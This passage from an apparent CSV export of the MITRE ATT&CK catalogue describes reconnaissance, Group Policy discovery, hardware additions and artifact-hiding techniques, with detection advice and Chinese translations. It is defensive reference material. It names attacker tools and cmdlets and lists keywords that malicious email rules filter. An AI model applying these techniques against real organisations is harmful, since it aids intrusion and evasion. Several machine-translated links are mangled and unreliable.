Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,,"(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Volexity Exchange Marauder March 2021),",收集受害者网络信息：IP 地址,攻击者可能会收集可在定位期间使用的受害者 IP 地址。公共 IP 地址可以按块或一系列连续地址分配给组织。有关分配的 IP 地址的信息可能包括各种详细信息，例如正在使用哪些 IP 地址。 IP 地址还可能使攻击者能够获取有关受害者的其他详细信息，例如组织规模、物理位置、互联网服务提供商，以及托管其面向公众的基础设施的位置/方式。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/技术/T1598）。有关分配的 IP 地址的信息也可能通过在线或其他可访问的数据集（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596））暴露给攻击者。（引用：WHOIS）（引文：DNS Dumpster）（引文：Circl Passive DNS）收集此信息可能会揭示其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[搜索开放网站/Domains](https://attack.mitre.org/techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure] (https://attack.mitre.org/techniques/T1584)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)）。
T1590.006,Gather Victim Network Information: Network Security Appliances,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/006,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,,",",收集受害者网络信息：网络安全设备,攻击者可能会收集有关受害者网络安全设备的信息，这些信息可以在定位期间使用。有关网络安全设备的信息可能包括各种细节，例如部署的防火墙、内容过滤器和代理/堡垒主机的存在和细节。攻击者还可能针对受害者基于网络的入侵检测系统 (NIDS) 或与防御性网络安全操作相关的其他设备的信息。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/techniques/T1598）。（引用：Nmap Firewalls NIDS）有关网络安全设备的信息也可能通过在线或其他可访问的数据集（例如：[搜索受害者拥有的网站]（https://attack.mitre.组织/技术/T1594))。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596) 或[搜索开放网站/域](https://attack. mitre.org/techniques/T1593)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)）。
T1590.004,Gather Victim Network Information: Network Topology,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/004,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,,",",收集受害者网络信息：网络拓扑,攻击者可能会收集有关受害者网络拓扑的信息，这些信息可以在定位期间使用。关于网络拓扑的信息可能包括各种细节，包括面向外部和内部网络环境的物理和/或逻辑布置。此信息还可能包括有关网络设备（网关、路由器等）和其他基础设施的详细信息。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/技术/T1598）。有关网络拓扑的信息也可能通过在线或其他可访问的数据集暴露给攻击者（例如：[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）。（引用：DNS Dumpster）收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596) 或[搜索开放网站/域](https://attack. mitre.org/techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org /techniques/T1584)）和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)）。
T1590.003,Gather Victim Network Information: Network Trust Dependencies,"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1590/003,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,,,,,,,,",",收集受害者网络信息：网络信任依赖,攻击者可能会收集有关受害者网络信任依赖关系的信息，这些信息可以在定位期间使用。有关网络信任的信息可能包括各种详细信息，包括已连接（并可能提升）网络访问权限的第二方或第三方组织/域（例如：托管服务提供商、承包商等）。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关网络信任的信息也可能通过在线或其他可访问的数据集（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596））暴露给对手。（引文：Pentesting AD Forests）收集此信息可能会发现其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[搜索开放网站/域]（https://attack.mitre. org/techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org/techniques /T1584)）和/或初始访问权限（例如：[受信任的关系](https://attack.mitre.org/techniques/T1199)）。
T1591,Gather Victim Org Information,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1591,02 October 2020,27 August 2021,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,False,,,,,,,,,,"(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: KISA Operation Muzabi),(Citation: ClearSky Lazarus Aug 2020),",收集受害者组织信息,攻击者可能会收集有关受害者组织的信息，这些信息可以在定位期间使用。有关组织的信息可能包括各种详细信息，包括部门/部门的名称、业务运营的具体情况以及关键员工的角色和职责。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关组织的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者拥有的网站]（ https://attack.mitre.org/techniques/T1594))。（引用：ThreatPost Broadvoice Leak）（引用：SEC EDGAR Search）收集此信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（ https://attack.mitre.org/techniques/T1598）或[搜索开放网站/域]（https://attack.mitre.org/techniques/T1593）），建立运营资源（例如：[建立帐户]（ https://attack.mitre.org/techniques/T1585) 或 [Compromise Accounts](https://attack.mitre.org/techniques/T1586))，和/或初始访问权限（例如：[Phishing](https: //attack.mitre.org/techniques/T1566) 或 [可信关系](https://attack.mitre.org/techniques/T1199))。
T1591.002,Gather Victim Org Information: Business Relationships,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1591/002,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: MSTIC DEV-0537 Mar 2022),",收集受害者组织信息：业务关系,攻击者可能会收集有关受害者业务关系的信息，这些信息可以在定位期间使用。有关组织的业务关系的信息可能包括各种详细信息，包括已连接（并可能提升）网络访问权限的第二方或第三方组织/域（例如：托管服务提供商、承包商等）。该信息还可能揭示受害者硬件和软件资源的供应链和运输路径。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关业务关系的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者拥有的网站]（ https://attack.mitre.org/techniques/T1594))。（引用：ThreatPost Broadvoice Leak）收集此信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（https://attack.mitre .org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源（例如：[建立帐户](https://attack.mitre) .org/techniques/T1585) 或 [Compromise Accounts](https://attack.mitre.org/techniques/T1586))，和/或初始访问权限（例如：[Supply Chain Compromise](https://attack.mitre) .org/techniques/T1195)、[Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 或 [可信关系](https://attack.mitre.org/techniques/T1199) ）。
T1591.001,Gather Victim Org Information: Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",https://attack.mitre.org/techniques/T1591/001,02 October 2020,27 August 2021,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,,",",收集受害者组织信息：确定物理位置,攻击者可能会收集可以在定位期间使用的受害者的物理位置。关于目标组织的物理位置的信息可能包括各种细节，包括关键资源和基础设施所在的位置。物理位置还可能表明受害者在哪个法律管辖区和/或机构内工作。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。目标组织的物理位置也可能通过在线或其他可访问的数据集（例如：[搜索受害者拥有的网站]（https://attack.mitre.org/techniques/T1594）或[社交媒体]（ https://attack.mitre.org/techniques/T1593/001))。（引用：ThreatPost Broadvoice Leak）（引用：SEC EDGAR Search）收集此信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或 [获得能力](https://attack.mitre.org/techniques/T1588))，和/或初始访问权限（例如：[网络钓鱼]( https://attack.mitre.org/techniques/T1566) 或 [硬件添加](https://attack.mitre.org/techniques/T1200))。
T1591.003,Gather Victim Org Information: Identify Business Tempo,"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",https://attack.mitre.org/techniques/T1591/003,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,,",",收集受害者组织信息：确定业务节奏,攻击者可能会收集有关受害者业务节奏的信息，这些信息可以在定位期间使用。有关组织的业务节奏的信息可能包括各种详细信息，包括一周中的营业时间/天数。该信息还可能揭示受害者硬件和软件资源的购买和发货时间/日期。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关业务节奏的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者拥有的网站]（ https://attack.mitre.org/techniques/T1594))。（引用：ThreatPost Broadvoice Leak）收集此信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（https://attack.mitre .org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源（例如：[建立帐户](https://attack.mitre) .org/techniques/T1585) 或 [Compromise Accounts](https://attack.mitre.org/techniques/T1586))，和/或初始访问权限（例如：[Supply Chain Compromise](https://attack.mitre) .org/techniques/T1195) 或 [可信关系](https://attack.mitre.org/techniques/T1199))
T1591.004,Gather Victim Org Information: Identify Roles,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1591/004,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1591,,,,,,,,,"(Citation: SecureWorks August 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Lazarus Jun 2020),(Citation: MSTIC DEV-0537 Mar 2022),",收集受害者组织信息：识别角色,攻击者可能会收集有关受害组织内的身份和角色的信息，这些信息可以在定位期间使用。有关业务角色的信息可能会揭示各种可定位的详细信息，包括关键人员的可识别信息以及他们有权访问的数据/资源。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关业务角色的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者拥有的网站]（ https://attack.mitre.org/techniques/T1594))。（引用：ThreatPost Broadvoice Leak）收集此信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（https://attack.mitre .org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源（例如：[建立帐户](https://attack.mitre) .org/techniques/T1585) 或 [Compromise Accounts](https://attack.mitre.org/techniques/T1586))，和/或初始访问权限（例如：[Phishing](https://attack.mitre.org /技术/T1566))。
T1615,Group Policy Discovery,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",https://attack.mitre.org/techniques/T1615,06 August 2021,15 October 2021,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.

Monitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.",Windows,"Active Directory: Active Directory Object Access, Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, Script: Script Execution",False,,,"Jonhnathan Ribeiro, 3CORESec, @_w0rk3r; Ted Samuels, Rapid7",User,,,,,,"(Citation: GitHub Bloodhound),(Citation: Emissary Trojan Feb 2016),(Citation: Github PowerShell Empire),(Citation: ESET ComRAT May 2020),",组策略发现,攻击者可能会收集有关组策略设置的信息，以识别权限提升的路径、域内应用的安全措施，并发现域对象中可以被操纵或用于混合环境的模式。组策略允许集中管理 Active Directory (AD) 中的用户和计算机设置。组策略对象 (GPO) 是组策略设置的容器，由存储在可预测网络路径 <code>\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</code> 中的文件组成。（引用：TechNet 组策略基础知识)（引用：ADSecurity GPO Persistence 2016）攻击者可能使用诸如 <code>gpresult</code> 之类的命令或各种公开可用的 PowerShell 函数，例如 <code>Get-DomainGPO</code> 和 <code>Get-DomainGPOLocalGroup< /code>，收集有关组策略设置的信息。（引用：Microsoft gpresult）（引用：Github PowerShell Empire）攻击者可能会使用此信息来塑造后续行为，包括确定目标网络中的潜在攻击路径以及机会为他们的利益操纵组策略设置（即[域策略修改](https://attack.mitre.org/techniques/T1484)）。
T1200,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.

While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)",https://attack.mitre.org/techniques/T1200,18 April 2018,28 April 2022,1.6,Initial Access,"Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. 

Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.","Linux, Windows, macOS","Application Log: Application Log Content, Drive: Drive Creation, Network Traffic: Network Traffic Flow",False,,,,,,,CAPEC-440,,,"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Wikipedia 802.1x)",硬件接入,攻击者可能会将计算机附件、网络硬件或其他计算设备引入系统或网络中，这些设备可用作获取访问权限的载体。不仅仅是通过可移动存储连接和分发有效负载（即[通过可移动媒体复制]（https://attack.mitre.org/techniques/T1091）），更强大的硬件添加可用于引入新功能和/或特性进入一个可以被滥用的系统。虽然威胁参与者使用的公开参考很少，但许多红队/渗透测试人员利用硬件添加来进行初始访问。商业和开源产品可以利用被动网络窃听、网络流量修改（即 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)）、击键注入、通过 DMA 读取内核内存，增加对现有网络的新无线访问等。（引文：Ossmann Star 2011 年 2 月）（引文：Aleks Weapons 2015 年 11 月）（引文：Frisk DMA 2016 年 8 月）（引文：McMillan Pwn 2012 年 3 月)
T1564,Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",https://attack.mitre.org/techniques/T1564,26 February 2020,25 March 2022,1.1,Defense Evasion,"Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.","Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Firmware: Firmware Modification, Process: OS API Execution, Process: Process Creation, Script: Script Execution, Service: Service Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification",False,,,,,,,,,,"(Citation: Check Point Warzone Feb 2020),(Citation: Tarrask scheduled task),(Citation: 20 macOS Common Tools and Techniques),(Citation: sentinelone shlayer to zshlayer),(Citation: Shlayer jamf gatekeeper bypass 2021),",隐藏工件/隐藏攻击行为,攻击者可能会试图隐藏与其行为相关的伪影以逃避检测。操作系统可能具有隐藏各种工件的功能，例如重要的系统文件和管理任务执行，以避免破坏用户工作环境并防止用户更改系统上的文件或功能。攻击者可能会滥用这些功能来隐藏文件、目录、用户帐户或其他系统活动等工件以逃避检测。（引用：Sofacy Komplex Trojan）（引用：Cybereason OSX Pirrit）（引用：MalwareBytes ADS 2015 年 7 月）尝试通过创建与常见安全工具隔离的计算区域来隐藏与恶意行为相关的工件，例如通过使用虚拟化技术。（引用：Sophos Ragnar 2020 年 5 月）
T1564.008,Hide Artifacts: Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)",https://attack.mitre.org/techniques/T1564/008,07 June 2021,12 April 2022,1.1,Defense Evasion,"Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.

